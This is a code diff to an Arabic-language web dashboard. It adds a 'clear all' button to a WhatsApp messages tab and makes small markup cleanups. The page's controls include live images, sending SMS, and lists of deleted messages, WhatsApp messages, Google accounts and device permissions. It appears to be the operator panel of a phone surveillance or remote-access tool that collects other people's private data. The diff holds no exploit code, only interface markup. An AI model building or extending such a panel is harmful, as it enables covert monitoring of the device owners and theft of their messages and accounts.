@@ -19,7 +19,6 @@
                 <button onclick="logout()" class="logout-btn">خروج</button>
             </div>
 
-            <!-- ✅ أزرار الفيد الحي -->
             <div style="display:flex;gap:12px;margin-top:15px;flex-wrap:wrap;justify-content:center;">
                 <button id="liveImagesBtn" onclick="openLiveImages()" style="background:linear-gradient(135deg,#00ffcc,#009977);color:#000;border:none;padding:12px 25px;border-radius:25px;font-weight:bold;font-size:14px;cursor:pointer;box-shadow:0 0 20px rgba(0,255,204,0.6);">
                     🆕 الصور الفورية <span id="liveImagesCount" style="background:#000;color:#00ffcc;padding:2px 8px;border-radius:10px;margin-right:5px;font-size:12px;">0</span>
@@ -35,7 +34,6 @@
                 </button>
             </div>
 
-            <!-- ✅ أزرار الأوامر -->
             <div style="display:flex;gap:12px;margin-top:10px;flex-wrap:wrap;justify-content:center;">
                 <button id="sendSmsBtn" onclick="openSendSms()" style="background:linear-gradient(135deg,#25D366,#128C7E);color:#fff;border:none;padding:12px 25px;border-radius:25px;font-weight:bold;font-size:14px;cursor:pointer;box-shadow:0 0 20px rgba(37,211,102,0.6);">
                     📨 إرسال SMS
@@ -120,10 +118,17 @@
                 <div id="deletedList"></div>
             </div>
 
+            <!-- ✅ محدّث: تبويب واتساب مع زر المسح -->
             <div id="whatsappTab" class="tab-pane">
-                <h3>💬 رسائل واتساب</h3>
+                <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:15px;flex-wrap:wrap;gap:10px;">
+                    <h3 style="margin:0;border:none;padding:0;">💬 رسائل واتساب</h3>
+                    <button onclick="clearWhatsAppList()" style="background:#ff3300;color:#fff;border:none;padding:8px 15px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">
+                        🗑️ مسح الكل
+                    </button>
+                </div>
                 <div id="whatsappList"></div>
             </div>
+
             <div id="googleTab" class="tab-pane">
                 <h3>📧 حسابات Google</h3>
                 <div id="googleAccountsList"></div>
@@ -159,7 +164,6 @@
                     <div id="deniedDevicesList" style="margin-top:10px;"></div>
                 </div>
 
-                <!-- ✅ قسم صلاحيات الأجهزة -->
                 <div style="margin-top:30px;">
                     <h4 style="color:#9b59b6;">🔐 صلاحيات الوصول للأجهزة</h4>
                     <p style="color:#888;font-size:12px;margin-bottom:15px;">
@@ -237,4 +241,4 @@
     function playSound() { try { const audio = new Audio('v.wav'); audio.volume = 1.0; audio.play(); } catch (e) {} }
     </script>
 </body>
-                    </html>
+    </html>
